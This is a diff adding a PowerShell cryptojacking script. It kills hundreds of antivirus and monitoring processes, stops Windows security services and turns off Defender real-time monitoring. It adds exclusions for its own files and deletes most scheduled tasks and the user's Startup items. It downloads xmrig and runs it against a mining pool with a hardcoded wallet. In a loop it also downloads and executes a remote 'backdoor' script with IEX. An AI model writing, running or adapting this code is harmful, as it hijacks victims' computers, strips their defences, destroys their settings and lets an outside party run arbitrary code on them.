@@ -1,0 +1,226 @@
+$banner = Write-Host -ForegroundColor DarkYellow "
+██████████  ████████  ████████    █████    █████
+███   ████  ████████  ████████    █████    █████
+███   ████  ████  ██████  ████      ███    ███ 
+█████████   ████  ██████  ████         ████
+███████     ████   ████   ████         ████
+███  ███    ████    ██    ████      ███    ███  
+███   ███   ████          ████    █████    █████
+███    ███  ████          ████    █████    █████
+═══     ══  ════          ═════   ═════    ═════
+═══     ══  ════          ═════   ═════    ═════ 
+═══     ══  ════          ═════   ═════    ═════
+v:1.0
+";
+
+$lista_process_avs = @("ccEvtMrg.exe","ccSetMgr.exe","nvsrvc32.exe","andnavapw32.exe","savscan.exe","windefend.exe","msmpsvc.exe","savservice.exe","aveservice.exe","immunetprotect.exe","fsma.exe","antivirservice.exe","fpavserver.exe","pshost.exe","pavsrv.exe","bdss.exe","abmainsv.exe","ikarus-guardx.exe","ekrn.exe","avkproxy.exe","klblmain.exe","vbservprof.exe","clamav.exe","SBAMSvc.exe","AAWTray.exe","Ad-Aware.exe","MSASCui.exe","_avp32.exe","_avpcc.exe","_avpm.exe","aAvgApi.exe","ackwin32.exe","adaware.exe","advxdwin.exe","agentsvr.exe","agentw.exe","alertsvc.exe","alevir.exe","alogserv.exe","amon9x.exe","anti-trojan.exe","antivirus.exe","ants.exe","apimonitor.exe","aplica32.exe","apvxdwin.exe","arr.exe","atcon.exe","atguard.exe","atro55en.exe","atupdater.exe","atwatch.exe","au.exe","aupdate.exe","auto-protect.nav80try.exe","autodown.exe","autotrace.exe","autoupdate.exe","avconsol.exe","ave32.exe","avgcc32.exe","avgctrl.exe","avgemc.exe","avgnt.exe","avgrsx.exe","avgserv.exe","avgserv9.exe","avguard.exe","avgw.exe","avkpop.exe","avkserv.exe","avkservice.exe","avkwctl9.exe","avltmain.exe","avnt.exe","avp.exe","avp.exe","avp32.exe","avpcc.exe","avpdos32.exe","avpm.exe","avptc32.exe","avpupd.exe","avsched32.exe","avsynmgr.exe","avwin.exe","avwin95.exe","avwinnt.exe","avwupd.exe","avwupd32.exe","avwupsrv.exe","avxmonitor9x.exe","avxmonitornt.exe","avxquar.exe","backweb.exe","bargains.exe","bd_professional.exe","beagle.exe","belt.exe","bidef.exe","bidserver.exe","bipcp.exe","bipcpevalsetup.exe","bisp.exe","blackd.exe","blackice.exe","blink.exe","blss.exe","bootconf.exe","bootwarn.exe","borg2.exe","bpc.exe","brasil.exe","bs120.exe","bundle.exe","bvt.exe","ccapp.exe","ccevtmgr.exe","ccpxysvc.exe","cdp.exe","cfd.exe","cfgwiz.exe","cfiadmin.exe","cfiaudit.exe","cfinet.exe","cfinet32.exe","claw95.exe","claw95cf.exe","clean.exe","cleaner.exe","cleaner3.exe","cleanpc.exe","click.exe","cmd.exe","cmd32.exe","cmesys.exe","cmgrdian.exe","cmon016.exe","connectionmonitor.exe","cpd.exe","cpf9x206.exe","cpfnt206.exe","ctrl.exe","cv.exe","cwnb181.exe","cwntdwmo.exe","datemanager.exe","dcomx.exe","defalert.exe","defscangui.exe","defwatch.exe","deputy.exe","divx.exe","dllcache.exe","dllreg.exe","doors.exe","dpf.exe","dpfsetup.exe","dpps2.exe","drwatson.exe","drweb32.exe","drwebupw.exe","dssagent.exe","dvp95.exe","dvp95_0.exe","ecengine.exe","efpeadm.exe","emsw.exe","ent.exe","esafe.exe","escanhnt.exe","escanv95.exe","espwatch.exe","ethereal.exe","etrustcipe.exe","evpn.exe","exantivirus-cnet.exe","exe.avxw.exe","expert.exe","explore.exe","f-agnt95.exe","f-prot.exe","f-prot95.exe","f-stopw.exe","fameh32.exe","fast.exe","fch32.exe","fih32.exe","findviru.exe","firewall.exe","fnrb32.exe","fp-win.exe","fp-win_trial.exe","fprot.exe","frw.exe","fsaa.exe","fsav.exe","fsav32.exe","fsav530stbyb.exe","fsav530wtbyb.exe","fsav95.exe","fsgk32.exe","fsm32.exe","fsma32.exe","fsmb32.exe","gator.exe","gbmenu.exe","gbpoll.exe","generics.exe","gmt.exe","guard.exe","guarddog.exe","hacktracersetup.exe","hbinst.exe","hbsrv.exe","hotactio.exe","hotpatch.exe","htlog.exe","htpatch.exe","hwpe.exe","hxdl.exe","hxiul.exe","iamapp.exe","iamserv.exe","iamstats.exe","ibmasn.exe","ibmavsp.exe","icload95.exe","icloadnt.exe","icmon.exe","icsupp95.exe","icsuppnt.exe","idle.exe","iedll.exe","iedriver.exe","iexplorer.exe","iface.exe","ifw2000.exe","inetlnfo.exe","infus.exe","infwin.exe","init.exe","intdel.exe","intren.exe","iomon98.exe","istsvc.exe","jammer.exe","jdbgmrg.exe","jedi.exe","kavlite40eng.exe","kavpers40eng.exe","kavpf.exe","kazza.exe","keenvalue.exe","kerio-pf-213-en-win.exe","kerio-wrl-421-en-win.exe","kerio-wrp-421-en-win.exe","kernel32.exe","killprocesssetup161.exe","launcher.exe","ldnetmon.exe","ldpro.exe","ldpromenu.exe","ldscan.exe","lnetinfo.exe","loader.exe","localnet.exe","lockdown.exe","lockdown2000.exe","lookout.exe","lordpe.exe","lsetup.exe","luall.exe","luau.exe","lucomserver.exe","luinit.exe","luspt.exe","mapisvc32.exe","mcagent.exe","mcmnhdlr.exe","mcshield.exe","mctool.exe","mcupdate.exe","mcvsrte.exe","mcvsshld.exe","md.exe","mfin32.exe","mfw2en.exe","mfweng3.02d30.exe","mgavrtcl.exe","mgavrte.exe","mghtml.exe","mgui.exe","minilog.exe","mmod.exe","monitor.exe","moolive.exe","mostat.exe","mpfagent.exe","mpfservice.exe","mpftray.exe","mrflux.exe","msapp.exe","msbb.exe","msblast.exe","mscache.exe","msccn32.exe","mscman.exe","msconfig.exe","msdm.exe","msdos.exe","msiexec16.exe","msinfo32.exe","mslaugh.exe","msmgt.exe","msmsgri32.exe","mssmmc32.exe","mssys.exe","msvxd.exe","mu0311ad.exe","mwatch.exe","n32scanw.exe","nav.exe","navap.navapsvc.exe","navapsvc.exe","navapw32.exe","navdx.exe","navlu32.exe","navnt.exe","navstub.exe","navw32.exe","navwnt.exe","nc2000.exe","ncinst4.exe","ndd32.exe","neomonitor.exe","neowatchlog.exe","netarmor.exe","netd32.exe","netinfo.exe","netmon.exe","netscanpro.exe","netspyhunter-1.2.exe","netstat.exe","netutils.exe","nisserv.exe","nisum.exe","nmain.exe","nod32.exe","normist.exe","norton_internet_secu_3.0_407.exe","notstart.exe","npf40_tw_98_nt_me_2k.exe","npfmessenger.exe","nprotect.exe","npscheck.exe","npssvc.exe","nsched32.exe","nssys32.exe","nstask32.exe","nsupdate.exe","nt.exe","ntrtscan.exe","ntvdm.exe","ntxconfig.exe","nui.exe","nupgrade.exe","nvarch16.exe","nvc95.exe","nvsvc32.exe","nwinst4.exe","nwservice.exe","nwtool16.exe","ollydbg.exe","onsrvr.exe","optimize.exe","ostronet.exe","otfix.exe","outpost.exe","outpostinstall.exe","outpostproinstall.exe","padmin.exe","panixk.exe","patch.exe","pavcl.exe","pavproxy.exe","pavsched.exe","pavw.exe","pccwin98.exe","pcfwallicon.exe","pcip10117_0.exe","pcscan.exe","pdsetup.exe","periscope.exe","persfw.exe","perswf.exe","pf2.exe","pfwadmin.exe","pgmonitr.exe","pingscan.exe","platin.exe","pop3trap.exe","poproxy.exe","popscan.exe","portdetective.exe","portmonitor.exe","powerscan.exe","ppinupdt.exe","pptbc.exe","ppvstop.exe","prizesurfer.exe","prmt.exe","prmvr.exe","procdump.exe","processmonitor.exe","procexplorerv1.0.exe","programauditor.exe","proport.exe","protectx.exe","pspf.exe","purge.exe","qconsole.exe","qserver.exe","rapapp.exe","rav7.exe","rav7win.exe","rav8win32eng.exe","ray.exe","rb32.exe","rcsync.exe","realmon.exe","reged.exe","regedit.exe","regedt32.exe","rescue.exe","rescue32.exe","rrguard.exe","rshell.exe","rtvscan.exe","rtvscn95.exe","rulaunch.exe","run32dll.exe","rundll.exe","rundll16.exe","ruxdll32.exe","safeweb.exe","sahagent.exe","save.exe","savenow.exe","sbserv.exe","sc.exe","scam32.exe","scan32.exe","scan95.exe","scanpm.exe","scrscan.exe","serv95.exe","setup_flowprotector_us.exe","setupvameeval.exe","sfc.exe","sgssfw32.exe","sh.exe","shellspyinstall.exe","shn.exe","showbehind.exe","smc.exe","sms.exe","smss32.exe","soap.exe","sofi.exe","sperm.exe","spf.exe","sphinx.exe","spoler.exe","spoolcv.exe","spoolsv32.exe","spyxx.exe","srexe.exe","srng.exe","ss3edit.exe","ssg_4104.exe","ssgrate.exe","st2.exe","start.exe","stcloader.exe","supftrl.exe","support.exe","supporter5.exe","svc.exe","svchostc.exe","svchosts.exe","svshost.exe","sweep95.exe","sweepnet.sweepsrv.sys.swnetsup.exe","symproxysvc.exe","symtray.exe","sysedit.exe","system.exe","system32.exe","sysupd.exe","taskmg.exe","taskmgr.exe","taskmo.exe","taskmon.exe","taumon.exe","tbscan.exe","tc.exe","tca.exe","tcm.exe","tds-3.exe","tds2-98.exe","tds2-nt.exe","teekids.exe","tfak.exe","tfak5.exe","tgbob.exe","titanin.exe","titaninxp.exe","tracert.exe","trickler.exe","trjscan.exe","trjsetup.exe","trojantrap3.exe","tsadbot.exe","tvmd.exe","tvtmd.exe","undoboot.exe","updat.exe","update.exe","upgrad.exe","utpost.exe","vbcmserv.exe","vbcons.exe","vbust.exe","vbwin9x.exe","vbwinntw.exe","vcsetup.exe","vet32.exe","vet95.exe","vettray.exe","vfsetup.exe","vir-help.exe","virusmdpersonalfirewall.exe","vnlan300.exe","vnpc3000.exe","vpc32.exe","vpc42.exe","vpfw30s.exe","vptray.exe","vscan40.exe","vscenu6.02d30.exe","vsched.exe","vsecomr.exe","vshwin32.exe","vsisetup.exe","vsmain.exe","vsmon.exe","vsstat.exe","vswin9xe.exe","vswinntse.exe","vswinperse.exe","w32dsm89.exe","w9x.exe","watchdog.exe","webdav.exe","webscanx.exe","webtrap.exe","wfindv32.exe","whoswatchingme.exe","wimmun32.exe","win-bugsfix.exe","win32.exe","win32us.exe","winactive.exe","window.exe","windows.exe","wininetd.exe","wininitx.exe","winlogin.exe","winmain.exe","winnet.exe","winppr32.exe","winrecon.exe","winservn.exe","winssk32.exe","winstart.exe","winstart001.exe","wintsk32.exe","winupdate.exe","wkufind.exe","wnad.exe","wnt.exe","wradmin.exe","wrctrl.exe","wsbgate.exe","wupdater.exe","wupdt.exe","wyvernworksfirewall.exe","xpf202en.exe","zapro.exe","zapsetup3001.exe","zatutor.exe","zonalm2601.exe","zonealarm.exe");
+$lista_services_avs = @("mpssvc","SecurityHealthService","WdNisSvc","wscsvc","SamSs","WinDefend","wuauserv","AVAST","avg");
+
+function delete-task{
+$task = "Windows Update";
+$taskN = ScheduledTask -TaskPath \ -ErrorAction Ignore;
+$taskN = $taskN.TaskName;
+ForEach ($tasks  in $taskN) {
+if($tasks -eq $task){
+Write-Host -ForegroundColor Green '[+]'$tasks;
+}else{
+Write-Host -ForegroundColor RED "[+][DELETE]" $tasks;
+Unregister-ScheduledTask -TaskPath \ $tasks -Confirm:$False -ErrorAction SilentlyContinue;
+}
+}
+}
+
+function taskkilll{
+cmd.exe /C taskkill /IM ddg.exe /f;
+cmd.exe /C taskkill /IM yam.exe /f;
+cmd.exe /C taskkill /IM miner.exe /f;
+cmd.exe /C taskkill /IM xmrig.exe /f;
+cmd.exe /C taskkill /IM nscpucnminer32.exe /f;
+cmd.exe /C taskkill /IM 1e.exe /f;
+cmd.exe /C taskkill /IM iie /f;
+cmd.exe /C taskkill /IM 3.exe /f;
+cmd.exe /C taskkill /IM iee.exe /f;
+cmd.exe /C taskkill /IM ie.exe /f;
+cmd.exe /C taskkill /IM je.exe /f;
+cmd.exe /C taskkill /IM ie.exe /f;
+cmd.exe /C taskkill /IM iexplorer.exe /f;
+}
+
+function process_finish{
+$counters = (Get-Counter "\Process(*)\% Processor Time").CounterSamples;
+$malwares = "Silence","Carbon","nscpuminer64","mrservicehost","servisce","miner64","thunderplatform","xmrig32","cpuminer","minergate";
+foreach ($counter in $counters){
+    If($counter.CookedValue -ge 50){
+        if($counter.InstanceName -eq "idle" -or $counter.InstanceName -eq "_total"){
+            Continue
+        }
+        foreach($malware in $malwares){
+            if($counter.InstanceName -eq $malware){
+                Stop-Process -processname $counter.InstanceName -Force;
+            }
+        }
+    }
+}
+}
+
+Function DownloadMiner(){
+Stop-Process -Name xmrig -ErrorAction SilentlyContinue
+$arch = (Get-WmiObject Win32_OperatingSystem).OSArchitecture
+if($arch -eq '32-bit'){
+    $clnt = New-Object System.Net.WebClient
+    $url = "https://github.com/xmrig/xmrig/releases/download/v2.3.1/xmrig-2.3.1-gcc-win32.zip"
+    $file = "C:\ProgramData\win32.zip"
+    $clnt.DownloadFile($url, $file)
+    New-Item "C:\ProgramData\x32\" -type directory
+    $shell_app=New-Object -Com shell.application
+    $zip_file = $shell_app.namespace($file)
+    $destination = $shell_app.namespace("c:\ProgramData\x32\")
+    $destination.Copyhere($zip_file.items(), 0x14)
+}
+else{
+    $clnt = New-Object System.Net.WebClient
+    $url = "https://github.com/xmrig/xmrig/releases/download/v2.3.1/xmrig-2.3.1-gcc-win64.zip"
+    $file = "C:\ProgramData\win64.zip"
+    $clnt.DownloadFile($url, $file)
+    New-Item "C:\ProgramData\x64\" -type directory
+    $shell_app=New-Object -Com shell.application
+    $zip_file = $shell_app.namespace($file)
+    $destination = $shell_app.namespace("c:\ProgramData\x64\")
+    $destination.Copyhere($zip_file.items(), 0x14)
+}
+}
+
+Function Miner{
+$OSA = (Get-WmiObject Win32_OperatingSystem).OSArchitecture
+if($OSA -eq '32-bit'){
+C:\ProgramData\x32\xmrig-2.3.1-gcc-win32\xmrig-2.3.1-gcc-win32\xmrig-2.3.1\xmrig.exe -o stratum+tcp://pool.minexmr.com:7777 -u 42PkwcWLCjheUAaXy2h6CndY9DoKvv4pQ6QogCxgnFFF268ueYNb2FXiLCgQeds64jAytuaXzFTctbsujZYzUuaRVhn8Cjd -p n -k -B --max-cpu-usage=50 --donate-level=0
+}
+else{
+C:\ProgramData\x64\xmrig-2.3.1-gcc-win64\xmrig-2.3.1-gcc-win64\xmrig-2.3.1\xmrig.exe -o stratum+tcp://pool.minexmr.com:7777 -u 42PkwcWLCjheUAaXy2h6CndY9DoKvv4pQ6QogCxgnFFF268ueYNb2FXiLCgQeds64jAytuaXzFTctbsujZYzUuaRVhn8Cjd -p n -k -B --max-cpu-usage=50 --donate-level=0
+
+}
+}
+
+function disable_defender{
+Write-Host -ForegroundColor GREEN "[+][DisableRealtimeMonitoring]";
+Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction Ignore;
+Write-Host -ForegroundColor GREEN "[+][DisableBehaviorMonitoring]" -ErrorAction Ignore;
+#Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction Ignore;
+Write-Host -ForegroundColor GREEN "[+][DisableBlockAtFirstSeen]";
+#Set-MpPreference -DisableBlockAtFirstSeen $true -ErrorAction Ignore;
+Write-Host -ForegroundColor GREEN "[+][DisableIOAVProtection]";
+#Set-MpPreference -DisableIOAVProtection $true -ErrorAction Ignore;
+Write-Host -ForegroundColor GREEN "[+][DisablePrivacyMode]";
+#Set-MpPreference -DisablePrivacyMode $true -ErrorAction Ignore;
+Write-Host -ForegroundColor GREEN "[+][SignatureDisableUpdateOnStartupWithoutEngine]";
+#Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true -ErrorAction Ignore;
+Write-Host -ForegroundColor GREEN "[+][DisableArchiveScanning]";
+#Set-MpPreference -DisableArchiveScanning $true -ErrorAction Ignore;
+Write-Host -ForegroundColor GREEN "[+][DisableIntrusionPreventionSystem]";
+#Set-MpPreference -DisableIntrusionPreventionSystem $true -ErrorAction Ignore;
+Write-Host -ForegroundColor GREEN "[+][DisableScriptScanning]";
+#Set-MpPreference -DisableScriptScanning $true -ErrorAction Ignore;
+Write-Host -ForegroundColor GREEN "[+][SubmitSamplesConsent]";
+#Set-MpPreference -SubmitSamplesConsent 2 -ErrorAction Ignore;
+Write-Host -ForegroundColor GREEN "[+][MAPSReporting]";
+#Set-MpPreference -MAPSReporting 0 -ErrorAction Ignore;
+Write-Host -ForegroundColor GREEN "[+][HighThreatDefaultAction]";
+#Set-MpPreference -HighThreatDefaultAction 6 -Force -ErrorAction Ignore;
+Write-Host -ForegroundColor GREEN "[+][ModerateThreatDefaultAction]";
+#Set-MpPreference -ModerateThreatDefaultAction 6 -ErrorAction Ignore;
+Write-Host -ForegroundColor GREEN "[+][LowThreatDefaultAction]";
+#Set-MpPreference -LowThreatDefaultAction 6 -ErrorAction Ignore;
+Write-Host -ForegroundColor GREEN "[+][SevereThreatDefaultAction]";
+#Set-MpPreference -SevereThreatDefaultAction 6 -ErrorAction Ignore;
+Write-Host -ForegroundColor GREEN "[+][ExclusionPath]";
+Add-MpPreference -ExclusionPath C:\Users\Public\Libraries\ -ErrorAction Ignore;
+Add-MpPreference -ExclusionPath C:\Users\Public\Libraries -ErrorAction Ignore;
+Add-MpPreference -ExclusionPath C:\ProgramData\win32.zip -ErrorAction Ignore;
+Add-MpPreference -ExclusionPath C:\ProgramData\x32\ -ErrorAction Ignore;
+Add-MpPreference -ExclusionPath C:\ProgramData\win64.zip -ErrorAction Ignore;
+Add-MpPreference -ExclusionPath C:\ProgramData\x64\ -ErrorAction Ignore;
+Add-MpPreference -ExclusionPath C:\ProgramData\x64\xmrig-2.14.0-gcc-win64\xmrig-2.14.0-gcc-win64\xmrig-2.14.0 -ErrorAction Ignore;
+Add-MpPreference -ExclusionPath C:\ProgramData\x32\xmrig-2.14.0-gcc-win32\xmrig-2.14.0-gcc-win32\xmrig-2.14.0 -ErrorAction Ignore;
+
+
+Write-Host -ForegroundColor GREEN "[+][ExclusionProcess xmrig.exe]";
+Add-MpPreference -ExclusionProcess "xmrig.exe" -ErrorAction Ignore;
+
+#Write-Host -ForegroundColor GREEN "[ExclusionExtension .exe]";
+#Add-MpPreference -ExclusionExtension ".exe" -ErrorAction Ignore;
+}
+
+function DeleteProcess{
+ForEach ($lista in $lista_process_avs) {TASKKILL /F /IM $lista /T}
+}
+
+function stop-services{
+ForEach ($servicio in $lista_services_avs) {NET STOP $servicio}
+}
+
+function DownloadFile{
+IEX (New-Object Net.WebClient).DownloadString('http://trsurl.com/sa/backdoor')
+}
+
+function remove-all{
+Remove-Item "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\*";
+}
+
+while($true){
+Write-Host -ForegroundColor GREEN "[+][CHECK INTERNET]";
+if($true){
+        Write-Host -ForegroundColor GREEN "[+][INTERNET ONLINE]";
+        DownloadFile
+            $a = Get-Process;$a = $a.ProcessName;
+            if($a  -eq "xmrig"){
+                Write-Host -ForegroundColor GREEN "[+][MINER RUNNING]";
+            }else{
+                Write-Host -ForegroundColor GREEN "[+][CHECK IF MINER EXIST]";
+                if((Test-Path C:\ProgramData\x32\xmrig-2.3.1-gcc-win32\xmrig-2.3.1-gcc-win32\xmrig-2.3.1\xmrig.exe) -or (Test-Path C:\ProgramData\x64\xmrig-2.3.1-gcc-win64\xmrig-2.3.1-gcc-win64\xmrig-2.3.1\xmrig.exe)){
+                     Write-Host -ForegroundColor GREEN "[+][MINER EXIST]";
+                     Write-Host -ForegroundColor GREEN "[+][START MINER]";
+                     Miner;
+                 }else{
+           Write-Host -ForegroundColor RED "[-][MINER NOT EXIST]";
+           Write-Host -ForegroundColor GREEN "[+][WAIT 3 SECONDS]";
+           start-sleep -Seconds 3;
+           Write-Host -ForegroundColor GREEN "[+][taskkilll]";
+           taskkilll
+           Write-Host -ForegroundColor GREEN "[+][WAIT 3 SECONDS]";
+           start-sleep -Seconds 3;
+           Write-Host -ForegroundColor GREEN "[+][process_finish";
+           process_finish
+           Write-Host -ForegroundColor GREEN "[+][WAIT 3 SECONDS]";
+           start-sleep -Seconds 3;
+           Write-Host -ForegroundColor GREEN "[+][DISABLE WINDOWS DEFENDER]";
+           disable_defender;
+           Write-Host -ForegroundColor GREEN "[+][WAIT 3 SECONDS]";
+           start-sleep -Seconds 3;
+           Write-Host -ForegroundColor GREEN "[+][DELETE PROCESS]";
+           DeleteProcess;
+           Write-Host -ForegroundColor GREEN "[+][WAIT 3 SECONDS]";
+           start-sleep -Seconds 3;
+           Write-Host -ForegroundColor GREEN "[+][STOP SERVICES]";
+           stop-services;
+           Write-Host -ForegroundColor GREEN "[+][WAIT 3 SECONDS]";
+           start-sleep -Seconds 3;
+           Write-Host -ForegroundColor GREEN "[+][REMOVE ALL FILES]";
+           remove-all;
+           Write-Host -ForegroundColor GREEN "[+][WAIT 3 SECONDS]";
+           start-sleep -Seconds 3;
+           Write-Host -ForegroundColor GREEN "[+][DELETE TASK]";
+           delete-task;
+           Write-Host -ForegroundColor GREEN "[+][WAIT 3 SECONDS]";
+           start-sleep -Seconds 3;
+           Write-Host -ForegroundColor GREEN "[DOWNLOAD MINER]";
+           DownloadMiner;
+           Write-Host -ForegroundColor GREEN "[+][START MINER]";
+           Miner;
+           }
+}
+}
+else{
+Write-Host -ForegroundColor RED -BackgroundColor Black "[-][INTERNET OFFLINE]";
+}
+Write-Host -ForegroundColor GREEN "[+][SLEEP 600 SEC.]";
+Start-Sleep -Seconds 600;}
